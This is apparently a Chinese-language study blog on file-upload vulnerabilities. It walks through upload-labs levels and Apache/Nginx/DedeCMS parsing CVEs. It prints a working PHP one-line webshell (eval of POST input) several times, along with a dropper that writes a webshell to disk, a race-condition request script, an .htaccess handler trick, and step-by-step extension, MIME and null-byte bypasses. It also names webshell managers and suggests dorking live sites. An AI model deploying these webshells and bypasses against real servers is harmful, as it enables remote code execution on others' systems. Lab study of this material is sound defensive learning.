+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<li><p>将shell.php放入php网站的根目录</p>
+</li>
+<li><p>启动phpstudy</p>
+</li>
+<li><p>访问<a target="_blank" rel="noopener" href="http://127.0.0.1/shell.php">phpinfo()</a>，结果显示php版本，代表一句话木马写入成功</p>
+</li>
+<li><p>使用post方式发送请求：1=system(‘whoami’)</p>
+</li>
+</ol>
+<p>​    <img src="/2023/01221/66.PNG" alt="66"></p>
+<h3 id="文件上传靶场"><a href="#文件上传靶场" class="headerlink" title="文件上传靶场"></a>文件上传靶场</h3><p>upload-labs:<a target="_blank" rel="noopener" href="https://github.com/c0ny1/upload-labs">upload-labs</a></p>
+<p>搭建方式：</p>
+<ul>
+<li><p>本地搭建</p>
+<ul>
+<li>phpstudy</li>
+</ul>
+</li>
+<li><p>docker搭建</p>
+<ul>
+<li>~~~dockerfile<br>docker pull tanyiqu/upload-labs:21<br>docker run -d -p 8089:80 tanyiqu/upload-labs:21<pre class="line-numbers language-none"><code class="language-none">
+ps:一些关卡只能通过Windows搭建实现，一些关卡只能通过Linux搭建实现，因此两种搭建方式都需要。
+
+#### Docker
+
+安装：[现成工具](https:&#x2F;&#x2F;meq.h5.xeknow.com&#x2F;s&#x2F;1QtIPk)
+
+[kali中安装doceker](https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;MeeX9nmUWB9WcsuCUXZnuw)
+
+docker管理工具
+
+~~~dockerfile
+docker pull portainer&#x2F;portainer
+
+docker run -d -p 9000:9000 --name portainer --restart&#x3D;always  -v
+&#x2F;var&#x2F;run&#x2F;docker.sock:&#x2F;var&#x2F;run&#x2F;docker.sock -v portainer_data:&#x2F;data 
+portainer&#x2F;portainer<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+</ul>
+</li>
+</ul>
+<h3 id="webshell管理工具"><a href="#webshell管理工具" class="headerlink" title="webshell管理工具"></a>webshell管理工具</h3><p><a target="_blank" rel="noopener" href="https://www.sohu.com/a/461035838_99907709">https://www.sohu.com/a/461035838_99907709</a></p>
+<p>Webshell管理工具非常多，目前主流且常用的有：</p>
+<h4 id="蚁剑-AntSword"><a href="#蚁剑-AntSword" class="headerlink" title="蚁剑(AntSword)"></a>蚁剑(AntSword)</h4><p>Github:<a target="_blank" rel="noopener" href="https://github.com/AntSwordProject/">https://github.com/AntSwordProject/</a></p>
+<h4 id="冰蝎-Behinder"><a href="#冰蝎-Behinder" class="headerlink" title="冰蝎(Behinder)"></a>冰蝎(Behinder)</h4><p>Github:<a target="_blank" rel="noopener" href="https://github.com/rebeyond/Behinder">https://github.com/rebeyond/Behinder</a></p>
+<h4 id="菜刀-Caidao"><a href="#菜刀-Caidao" class="headerlink" title="菜刀(Caidao)"></a>菜刀(Caidao)</h4><p>官网已经倒了，知道有这么个东西就行</p>
+<h4 id="哥斯拉-Godzilla"><a href="#哥斯拉-Godzilla" class="headerlink" title="哥斯拉(Godzilla)"></a>哥斯拉(Godzilla)</h4><p>Github:<a target="_blank" rel="noopener" href="https://github.com/BeichenDream/Godzilla">https://github.com/BeichenDream/Godzilla</a></p>
+<h3 id="文件上传前端绕过"><a href="#文件上传前端绕过" class="headerlink" title="文件上传前端绕过"></a>文件上传前端绕过</h3><p>环境：uplo-labs靶场 Windows&amp;Linux</p>
+<p>关卡：Pass-01</p>
+<p>此关卡中，网站只在客户端（浏览器）进行文件的验证。</p>
+<ol>
+<li>上传一个shell.php扩展名的文件，显示文件不允许上传，同时显示扩展名白名单</li>
+</ol>
+<p><img src="/2023/01221/67.PNG" alt="67"></p>
+<ol start="2">
+<li>分析html中源码，在上传中发现存在一个JS验证</li>
+</ol>
+<p><img src="/2023/01221/68.PNG" alt="68"></p>
+<ol start="3">
+<li>删除JS验证，重新上传shell.php，发现上传成功</li>
+</ol>
+<p><img src="/2023/01221/69.PNG" alt="69"></p>
+<p>在新的标签页打开上传的图片，显示php代码被解析，成功！！！</p>
+<p><img src="/2023/01221/70.PNG" alt="70"></p>
+<h3 id="JSP木马"><a href="#JSP木马" class="headerlink" title="JSP木马"></a>JSP木马</h3><p>JSP环境：</p>
+<pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">docker pull tanyiqu&#x2F;demo-upload:simple_jsp
+
+docker run -d -p 8089:8080 tanyiqu&#x2F;demo-upload:simple_jsp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<ol>
+<li>打开蚁剑，随便添加一条数据，选中，点击上方的生成shell,选择jsp格式生成（上方的shell生成小工具是插件，可以自行查找添加）</li>
+</ol>
+<p><img src="/2023/01221/71.PNG" alt="71"></p>
+<ol start="2">
+<li>上传之后链接，显示白屏，成功</li>
+</ol>
+<p><img src="/2023/01221/72.PNG" alt="72"></p>
+<ol start="3">
+<li>蚁剑连接成功</li>
+</ol>
+<p><img src="/2023/01221/73.PNG" alt="73"></p>
+<h2 id="文件上传黑名单绕过"><a href="#文件上传黑名单绕过" class="headerlink" title="文件上传黑名单绕过"></a>文件上传黑名单绕过</h2><h3 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h3><p>搭建好upload-labs靶场，无论是哪种绕过，首先代码审计，判断黑白名单</p>
+<h3 id="黑白名单"><a href="#黑白名单" class="headerlink" title="黑白名单"></a>黑白名单</h3><p>黑名单：黑名单是一个列表，在黑名单列表里面记录的内容（人、手机号、ip等）或被限制或禁止执行一些操作。</p>
+<p>白名单：白名单与黑名单相对，也是一个列表，只有在白名单列表里的内容（人、手机号、ip等）才可以执行一些操作，不在白名单记录的内容（人、手机号、ip等）则会被禁止执行操作。</p>
+<p>文件上传漏洞黑名单：</p>
+<p>某些网站禁止用户上传扩展名为 .asp .php .aspx .jsp 的文件， .asp .php .aspx .jsp 这个列表就叫做黑名单。</p>
+<p>文件上传漏洞白名单：</p>
+<p>某些网站只允许用户上传扩展名为 .png .jpg .gif 的文件， .png .jpg .gif 这个列表就叫做白名单。</p>
+<h3 id="MIME绕过"><a href="#MIME绕过" class="headerlink" title="MIME绕过"></a>MIME绕过</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>MIME：（Multipurpose Internet Mail Extensions），MIME是一种标准，用来表示文档、文件或字节流的性质和格式。</p>
+<p>常见的MIME：</p>
+<p><img src="/2023/01221/74.PNG" alt="74"></p>
+<p>服务器在检测上传的图片时，可能会检测文件的MIME类型。</p>
+<p>此类检测可以通过修改MIME进行绕过</p>
+<h4 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h4><p>环境：uplo-labs靶场 Windows&amp;Linux</p>
+<p>工具：Burpsuit</p>
+<p>关卡：Pass-02</p>
+<p>此关卡中，网站服务端检测 Content-Type （MIME）内容。</p>
+<ol>
+<li><p>开启代理和bp拦截</p>
+</li>
+<li><p>选择一个PHP文件上传</p>
+</li>
+<li><p>修改http包中的 Content-Type 为 image/png(如果害怕格式不对，可以先上传一个正确的格式复制，之后再去改上传php文件时的格式)</p>
+</li>
+</ol>
+<ul>
+<li>先上传白名单图片</li>
+</ul>
+<p><img src="/2023/01221/75.PNG" alt="75"></p>
+<ul>
+<li>在上传不是白名单的图片，修改Content-Type</li>
+</ul>
+<p><img src="/2023/01221/76.PNG" alt="76"></p>
+<ol start="4">
+<li>上传成功</li>
+</ol>
+<p><img src="/2023/01221/77.PNG" alt="77"></p>
+<h3 id="特殊扩展名绕过"><a href="#特殊扩展名绕过" class="headerlink" title="特殊扩展名绕过"></a>特殊扩展名绕过</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>由于历史原因，部分解释器可能支持符合正则 /ph(p[2-7]?|t(ml)?)/ 的后缀，如 php / php5 / pht / phtml / shtml / pwml / phtm 等 可在禁止上传php文件时测试该类型。</p>
+<h4 id="演示-1"><a href="#演示-1" class="headerlink" title="演示"></a>演示</h4><p>环境：uplo-labs靶场 <strong>Linux</strong></p>
+<p>工具：Burpsuit</p>
+<p>关卡：Pass-03</p>
+<p>此关卡中，网站只过滤 .asp|.aspx|.php|.jsp 后缀文件。</p>
+<ol>
+<li><p>将木马php文件扩展名改成 .phtml</p>
+</li>
+<li><p>直接上传 .phtml 文件</p>
+</li>
+<li><p>上传成功后访问</p>
+</li>
+</ol>
+<h3 id="htaccess绕过"><a href="#htaccess绕过" class="headerlink" title="htaccess绕过"></a>htaccess绕过</h3><h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><p>.htaccess文件 (或者“分布式配置文件”）,全称是 Hypertext Access(超文本入口)。</p>
+<p>提供了针对目录改变配置的方法，即在一个特定的文档目录中放置一个包含一个或多个指令的文件，以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过 Apache的AllowOverride指令来设置。</p>
+<p><strong>.htaccess</strong>在文件上传中最大作用就是 可以使任何类型文件作为 php解析，该文件在 Apache里默认是启用的。</p>
+<h4 id="演示-2"><a href="#演示-2" class="headerlink" title="演示"></a>演示</h4><p>环境：uplo-labs靶场 <strong>Linux</strong></p>
+<p>工具：Burpsuit</p>
+<p>关卡：Pass-04</p>
+<p>此关卡中，网站过滤黑名单中没有 .htaccess。</p>
+<ol>
+<li>准备一个 a.htaccess 文件，内容如下：</li>
+</ol>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">SetHandler application<span class="token operator">/</span>x<span class="token operator">-</span>httpd<span class="token operator">-</span>php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<ol start="2">
+<li>使用bp抓包上传 a.htaccess，并在上传时将名称改成 .htaccess</li>
+</ol>
+<p><img src="/2023/01221/78.PNG" alt="78"></p>
+<ol start="2">
+<li>将php木马修改名称，改成随意的扩展名，如 shell.ppp，并直接上传</li>
+<li>访问 shell.ppp，解析成功</li>
+</ol>
+<h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><h4 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h4><p>网站在过滤扩展名时，如果没有将字符串统一大小写后再进行比较的话，可以通过修改扩展名大小写的方式绕过。</p>
+<h4 id="演示-3"><a href="#演示-3" class="headerlink" title="演示"></a>演示</h4><p>环境：uplo-labs靶场 <strong>Linux</strong></p>
+<p>工具：Burpsuit</p>
+<p>关卡：Pass-06</p>
+<p>此关卡中，网站过滤黑名单没有验证大小写。</p>
+<ol>
+<li><p>将php的木马，修改扩展名为 phP</p>
+</li>
+<li><p>上传此文件，直接解析成功</p>
+</li>
+</ol>
+<h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><h4 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h4><p>在Windows中，文件首位如果有空格，系统会默认去除。</p>
+<p>如：”example.php “ 文件会被修改成：”example.php”</p>
+<p>但是在服务器字符串匹配时，”.php “ 与 “.php”匹配不成功，即可绕过。</p>
+<h4 id="演示-4"><a href="#演示-4" class="headerlink" title="演示"></a>演示</h4><p>环境：uplo-labs靶场 <strong>Windows</strong></p>
+<p>工具：Burpsuit</p>
+<p>关卡：Pass-07</p>
+<p>此关卡中，网站过滤黑名单没有去除首尾空格。</p>
+<ol>
+<li><p>上传php木马，使用bp抓包</p>
+</li>
+<li><p>修改文件名，在某尾加上一些空格</p>
+</li>
+</ol>
+<p><img src="/2023/01221/79.PNG" alt="79"></p>
+<ol start="3">
+<li>解析成功</li>
+</ol>
+<h3 id="点号绕过"><a href="#点号绕过" class="headerlink" title="点号绕过"></a>点号绕过</h3><h4 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h4><p>在windows中，文件名最末尾的 点不会被解析</p>
+<h4 id="演示-5"><a href="#演示-5" class="headerlink" title="演示"></a>演示</h4><p>环境：uplo-labs靶场 <strong>Windows</strong></p>
+<p>工具：Burpsuit</p>
+<p>关卡：Pass-08</p>
+<p>此关卡中，网站过滤黑名单没有去除末尾的点。</p>
+<ol>
+<li><p>上传php木马，使用bp抓包</p>
+</li>
+<li><p>修改文件名，在某尾加上一个点</p>
+</li>
+<li><p>解析成功</p>
+</li>
+</ol>
+<h3 id="点-空格-点绕过"><a href="#点-空格-点绕过" class="headerlink" title="点+空格+点绕过"></a>点+空格+点绕过</h3><h4 id="原理-6"><a href="#原理-6" class="headerlink" title="原理"></a>原理</h4><p>PHP中的 deldot()函数会删除字符串中的点，但是该函数检测到末尾的第一个点之后，会删除，并且继续检测。如果遇到空格则会停止删除。构造 点 空格 点 即可进行绕过</p>
+<h4 id="演示-6"><a href="#演示-6" class="headerlink" title="演示"></a>演示</h4><p>环境：uplo-labs靶场 <strong>Windows</strong></p>
+<p>工具：Burpsuit</p>
+<p>关卡：Pass-10</p>
+<p>此关卡中，网站过滤黑名单使用deldot()函数删除末尾的点。</p>
+<ol>
+<li><p>上传php木马，使用bp抓包</p>
+</li>
+<li><p>修改文件名，在某尾加上 点 空格 点</p>
+</li>
+</ol>
+<p><img src="/2023/01221/80.PNG" alt="80"></p>
+<ol start="3">
+<li>解析成功</li>
+</ol>
+<h3 id="特殊字符-DATA绕过"><a href="#特殊字符-DATA绕过" class="headerlink" title="特殊字符:$DATA绕过"></a>特殊字符:$DATA绕过</h3><h4 id="原理-7"><a href="#原理-7" class="headerlink" title="原理"></a>原理</h4><p>在 window的时候如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持”::$DATA”之前的文件名他的目的就是不检查后缀名。</p>
+<p>如：a.php::$DATA 与 a.php 等价</p>
+<h4 id="演示-7"><a href="#演示-7" class="headerlink" title="演示"></a>演示</h4><p>环境：uplo-labs靶场 <strong>Windows</strong></p>
+<p>工具：Burpsuit</p>
+<p>关卡：Pass-09</p>
+<p>此关卡中，网站过滤黑名单没有检测::$DATA。</p>
+<ol>
+<li><p>上传php木马，使用bp抓包</p>
+</li>
+<li><p>修改文件名，在某尾加上 ::$DATA</p>
+</li>
+</ol>
+<p><img src="/2023/01221/81.PNG" alt="81"></p>
+<ol start="3">
+<li>上传成功，在访问时去除::$DATA即可</li>
+</ol>
+<p><img src="/2023/01221/82.PNG" alt="82"></p>
+<h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><h4 id="原理-8"><a href="#原理-8" class="headerlink" title="原理"></a>原理</h4><p>PHP中 str_ireplace(find,replace,string,count) 函数替换字符串中的一些字符（不区分大小写）且只能去除一次。</p>
+<p>如果后端服务器在验证扩展名时，没有递归替换扩展名的话，可以使用双写扩展名的方式进行绕过。</p>
+<h4 id="演示-8"><a href="#演示-8" class="headerlink" title="演示"></a>演示</h4><p>环境：uplo-labs靶场 <strong>Windows</strong>&amp;<strong>Linux</strong></p>
+<p>工具：Burpsuit</p>
+<p>关卡：Pass-11</p>
+<p>此关卡中，网站过滤黑名单没有递归删除扩展名。</p>
+<ol>
+<li><p>上传php木马，使用bp抓包</p>
+</li>
+<li><p>修改文件名扩展名，改为 .pphphp</p>
+</li>
+</ol>
+<p><img src="/2023/01221/83.PNG" alt="83"></p>
+<ol start="3">
+<li>上传成功，并且可直接访问解析</li>
+</ol>
+<p><strong>注意</strong>：不要改成 <strong>php</strong>hpp，否则会被替换后扩展名会变成 hpp</p>
+<h3 id="00截断-GET"><a href="#00截断-GET" class="headerlink" title="00截断-GET"></a>00截断-GET</h3><h4 id="原理-9"><a href="#原理-9" class="headerlink" title="原理"></a>原理</h4><p>php的一些函数的底层是 C语言，C语言的字符串中，如果遇到0x00会被编译器认为是字符串结束标志，会把该字符串截断。0x表示 16进制，URL中%00解码成 16进制就是 0x00。可以构造名字带有%00木马上传，进行绕过</p>
+<h4 id="演示-9"><a href="#演示-9" class="headerlink" title="演示"></a>演示</h4><p>环境：uplo-labs靶场 <strong>Windows</strong></p>
+<p>工具：Burpsuit</p>
+<p>关卡：Pass-12</p>
+<p>必要配置：</p>
+<ul>
+<li><p>php 版本 &lt;5.3.4 才可以进行00截断</p>
+</li>
+<li><p>magic_quotes_gpc = Off（改文件在php.ini配置文件中）</p>
+</li>
+</ul>
+<ol>
+<li>上传php木马，使用bp抓包</li>
+<li>修改 save_path=../upload/shell.php%00 、 filename=a.png</li>
+</ol>
+<p><img src="/2023/01221/84.PNG" alt="84"></p>
+<ol start="3">
+<li>访问 shell.php即可</li>
+</ol>
+<h3 id="00截断-POST"><a href="#00截断-POST" class="headerlink" title="00截断-POST"></a>00截断-POST</h3><h4 id="原理-10"><a href="#原理-10" class="headerlink" title="原理"></a>原理</h4><p>原理同GET方式，只不过传参方式为POST</p>
+<h4 id="演示-10"><a href="#演示-10" class="headerlink" title="演示"></a>演示</h4><p>环境：uplo-labs靶场 <strong>Windows</strong></p>
+<p>工具：Burpsuit</p>
+<p>关卡：Pass-13</p>
+<p>必要配置：</p>
+<ul>
+<li><p>php 版本 &lt;5.3.4 才可以进行00截断</p>
+</li>
+<li><p>magic_quotes_gpc = Off（改文件在php.ini配置文件中）</p>
+</li>
+</ul>
+<ol>
+<li><p>上传php木马，使用bp抓包</p>
+</li>
+<li><p>修改 ../upload/shell.php.png filename=shell.png</p>
+</li>
+</ol>
+<p><img src="/2023/01221/85.PNG" alt="85"></p>
+<ol start="3">
+<li>添加%00</li>
+</ol>
+<p>​    在光标位置输入一个空格，并选中它，在右边改为00</p>
+<p><img src="/2023/01221/86.PNG" alt="86"></p>
+<ol start="4">
+<li>上传成功，访问 shell.php即可</li>
+</ol>
+<h2 id="文件上传-图片马及文件解析漏洞利用"><a href="#文件上传-图片马及文件解析漏洞利用" class="headerlink" title="文件上传-图片马及文件解析漏洞利用"></a>文件上传-图片马及文件解析漏洞利用</h2><h3 id="图片马的制作与利用"><a href="#图片马的制作与利用" class="headerlink" title="图片马的制作与利用"></a>图片马的制作与利用</h3><h4 id="图片马"><a href="#图片马" class="headerlink" title="图片马"></a>图片马</h4><p>图片马就是在图片中隐藏一句话木马，使用正常的图片上传功能将该图片马上传至服务器后，再利用htaccess、文件包含漏洞或者解析漏洞即可发挥作用。</p>
+<p>注：单纯的上传图片马并不会发挥作用，必须配合其他漏洞。</p>
+<h4 id="图片马制作"><a href="#图片马制作" class="headerlink" title="图片马制作"></a>图片马制作</h4><p>注意事项：</p>
+<ul>
+<li><p>图片大小不宜过大</p>
+</li>
+<li><p>尽量为一句话木马</p>
+</li>
+</ul>
+<p>制作命令：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">copy <span class="token number">1.</span>jpg<span class="token operator">/</span>b <span class="token operator">+</span> <span class="token number">2.</span>php<span class="token operator">/</span>a <span class="token number">3.</span>jpg <span class="token comment"># b-->二进制;a-->ascii,图片可加绝对路径</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2023/01221/87.PNG" alt="87"></p>
+<h4 id="图片马绕过"><a href="#图片马绕过" class="headerlink" title="图片马绕过"></a>图片马绕过</h4><p>环境：uplo-labs靶场 <strong>Linux</strong></p>
+<p>工具：Burpsuit</p>
+<p>关卡：Pass-14</p>
+<p>此关卡中，网站检查图标内容开头2个字节！</p>
+<ol>
+<li><p>将木马直接上传</p>
+</li>
+<li><p>上传成功后访问</p>
+</li>
+</ol>
+<p>​        <a target="_blank" rel="noopener" href="http://192.168.111.136:8089/include.php?file=upload/5820230314052947.jpg">phpinfo()</a></p>
+<p>其中：upload/5820230314052947.jpg，将上传的文件在新的标签页中打开，url中存在该链接</p>
+<h4 id="条件竞争绕过"><a href="#条件竞争绕过" class="headerlink" title="条件竞争绕过"></a>条件竞争绕过</h4><p>条件竞争是代码逻辑存在问题，代码执行逻辑为：服务器先将上传的文件保存在临时目录中，然后再对后缀名进行白名单验证。如果符合白名单的要求，并重命名，但如果不符合白名单的要求，就会被删除掉。</p>
+<p>代码删除文件是需要耗费时间的，如果我们能够在文件被删除之前就访问到了此文件，那么即使删除了也无所谓。这个过程就叫做条件竞争。</p>
+<p>环境：upload-labs靶场 <strong>Linux</strong></p>
+<p>工具：Burpsuit</p>
+<p>关卡：Pass-18，17关也可以</p>
+<ol>
+<li>分析代码</li>
+</ol>
+<p>​        服务器先将上传的文件保存下来，然后通过白名单进行比较。如果为jpg、png、gif中的一种，就将文件进行重命名，如果不符合则删除该文件。</p>
+<ol start="2">
+<li>准备php特殊马(写入马)</li>
+</ol>
+<p>shell.php</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">fputs</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'a.php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'&lt;?php eval($_POST[1]); phpinfo(); ?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<ol start="3">
+<li>准备批量访问脚本</li>
+</ol>
+<p>test1.py</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+url <span class="token operator">=</span> <span class="token string">"http://ip:端口/upload/shell.php"</span>
+<span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
+	requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ol start="4">
+<li>上传shell.php，进行抓包，将抓到的包发给Intruder模块</li>
+<li>设置payload</li>
+</ol>
+<p><img src="/2023/01221/89.PNG" alt="89"></p>
+<ol start="6">
+<li><p><strong>执行</strong>python脚本，<strong>开启</strong>burp爆破(存在先后顺序)</p>
+</li>
+<li><p>访问链接：<a href="http://ip:端口/upload/a.php">http://ip:端口/upload/a.php</a></p>
+</li>
+</ol>
+<p>如果出现 phpinfo页面，则说明条件竞争执行成功，退出脚本和爆破</p>
+<ol start="8">
+<li>使用antsword链接一句话木马即可</li>
+</ol>
+<h3 id="文件解析漏洞利用"><a href="#文件解析漏洞利用" class="headerlink" title="文件解析漏洞利用"></a>文件解析漏洞利用</h3><h4 id="Apache-HTTPD解析漏洞"><a href="#Apache-HTTPD解析漏洞" class="headerlink" title="Apache HTTPD解析漏洞"></a>Apache HTTPD解析漏洞</h4><p>Apache HTTPD 支持一个文件拥有多个后缀，并为不同后缀执行不同的指令。</p>
+<p>在有多个后缀的情况下，只要一个文件含有.php后缀的文件即将被识别成PHP文件，没必要是最后一个后缀。</p>
+<p>如：a.php.jpg 文件会被当成 php文件执行</p>
+<p>利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。</p>
+<h5 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h5><p>docker镜像：vulfocus/httpd-apache_parsing_vulnerability:latest</p>
+<p>启动环境：</p>
+<pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">docker pull vulfocus&#x2F;httpd-apache_parsing_vulnerability:latest
+
+docker run -d -p 8081:80 vulfocus&#x2F;httpd-apache_parsing_vulnerability:latest<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>创建一个名为：a.php.jpg的图片</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>使用普通的方式上传上去，访问即可</p>
+<p>http//ip:端口/uploadfiles/a.php.jpg(我的地址)</p>
+<h4 id="Nginx解析漏洞-未成功"><a href="#Nginx解析漏洞-未成功" class="headerlink" title="Nginx解析漏洞(未成功)"></a>Nginx解析漏洞(未成功)</h4><p>影响版本：</p>
+<p>nginx 1.x</p>
+<p>php 7.x</p>
+<h5 id="漏洞环境-1"><a href="#漏洞环境-1" class="headerlink" title="漏洞环境"></a>漏洞环境</h5><p>Vulhub：<a target="_blank" rel="noopener" href="https://vulhub.org/">https://vulhub.org/</a></p>
+<p>vulhub：nginx/nginx_parsing_vulnerability</p>
+<p>启动环境：docker-compose up -d</p>
+<ul>
+<li><p>制作图片马</p>
+</li>
+<li><p>上传图片马，保存路径</p>
+<p>访问图片的地址，在地址的后面加上 /.php</p>
+</li>
+</ul>
+<p>漏洞查找</p>
+<p>搜索引擎：inurl:php</p>
+<p>找到访问网站，在后面添加 /.php 测试即可</p>
+<h4 id="Apache-CVE-2017-15715"><a href="#Apache-CVE-2017-15715" class="headerlink" title="Apache CVE-2017-15715"></a>Apache CVE-2017-15715</h4><p>Apache换行解析漏洞 。于 apache 在修复第一个后缀名解析漏洞时，用正则来匹配后缀。在解析 php时 xxx.php\x0A 将被按照 php 后缀进行解析，导致绕过一些服务器的安全策略。</p>
+<p>影响版本：2.4.0 ~ 2.4.29</p>
+<h5 id="漏洞环境-2"><a href="#漏洞环境-2" class="headerlink" title="漏洞环境"></a>漏洞环境</h5><p>vulhub：httpd/CVE-2017-15715</p>
+<p>启动环境：docker-compose up -d</p>
+<p>上传1.php文件，并且拦截，发送至重发器</p>
+<p>在重发器中，将文件名改成 a.php**%0a**</p>
+<p><strong>0a</strong>要使用16进制的方式添加进去</p>
+<p><img src="/2023/01221/90.PNG" alt="90"></p>
+<p>之后把包发送出去，返回值 200</p>
+<p>访问 /evil.php%0a 即可解析成功</p>
+<p><img src="/2023/01221/91.PNG" alt="91"></p>
+<h4 id="Nginx-CVE-2013-4547"><a href="#Nginx-CVE-2013-4547" class="headerlink" title="Nginx CVE-2013-4547"></a>Nginx CVE-2013-4547</h4><p>Nginx文件名逻辑解析漏洞</p>
+<p>Nginx错误地解析了请求的URL,错误地获取到用户请求的文件名,导致出现权限绕过、代码执行的连带影响。</p>
+<p>上传名为 a.jpg 的PHP文件，抓包后在文件名称末尾拼接 16进制的 0x20 0x00 即可解析</p>
+<p>影响版本：Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7</p>
+<h5 id="漏洞环境-3"><a href="#漏洞环境-3" class="headerlink" title="漏洞环境"></a>漏洞环境</h5><p>vulhub：nginx/CVE-2013-4547</p>
+<p>启动环境：docker-compose up -d</p>
+<p>上传一个 c.jpg 文件，抓包修改文件名，后面加上空格，内容如下：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>再抓一个访问index的GET方式的包，访问 /uploadfiles/c.jpg[0x20][0x00].php 即可</p>
+<p>0x20 和 0x00 为16进制</p>
+<p><img src="/2023/01221/92.PNG" alt="92"></p>
+<p>真实利用时，可以使用PHP代码写入一个木马</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">fputs</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'shell.php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'&lt;?php @eval($_POST[1]); phpinfo(); ?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="大马分享"><a href="#大马分享" class="headerlink" title="大马分享"></a>大马分享</h3><p><a target="_blank" rel="noopener" href="https://github.com/tennc/webshell">https://github.com/tennc/webshell</a></p>
+<h2 id="CMS漏洞测试练习"><a href="#CMS漏洞测试练习" class="headerlink" title="CMS漏洞测试练习"></a>CMS漏洞测试练习</h2><h3 id="CVE-2019-8933-dedecms文件上传"><a href="#CVE-2019-8933-dedecms文件上传" class="headerlink" title="CVE-2019-8933 dedecms文件上传"></a>CVE-2019-8933 dedecms文件上传</h3><p>DedeCMS 5.7SP2版本中存在安全漏洞。远程攻击者可通过在添加新模板时，将文件名../index.html更改成../index.php利用该漏洞向uploads/目录上传.php文件并执行该文件。</p>
+<p>影响版本：DedeCMS 5.7SP2</p>
